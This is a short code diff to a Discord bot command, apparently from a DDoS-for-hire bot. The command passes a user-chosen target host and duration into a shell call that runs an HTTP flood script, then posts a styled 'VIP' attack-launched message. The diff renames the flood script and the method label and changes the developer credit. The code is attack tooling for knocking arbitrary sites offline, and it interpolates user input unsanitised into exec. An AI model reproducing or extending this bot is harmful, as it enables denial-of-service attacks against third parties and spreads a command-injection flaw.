@@ -24,7 +24,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node flood.js ${host} ${duration}`, (error, stdout, stderr) => {
+exec(`node HTTP-FLOOD.js ${host} ${duration}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -35,8 +35,8 @@ const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('🚀 **HwangSangg Bot** 🚀')
 	.setTimestamp()
-  .setDescription("**𝓟𝓵𝓪𝓷**: `VIP 👨` \n **𝓣𝓪𝓻𝓰𝓮𝓽** : `" + host + "` \n **𝓜𝓮𝓽𝓱𝓸𝓭** : `HTTP-RAW 💣` \n **𝓣𝓲𝓶𝓮** : `" + duration + "`")
-	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
+  .setDescription("**𝓟𝓵𝓪𝓷**: `VIP 👨` \n **𝓣𝓪𝓻𝓰𝓮𝓽** : `" + host + "` \n **𝓜𝓮𝓽𝓱𝓸𝓭** : `HTTP-Flood 💣` \n **𝓣𝓲𝓶𝓮** : `" + duration + "`")
+	.setFooter('© Developer: hwangsangg', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(attackgif)
 	.setThumbnail("")
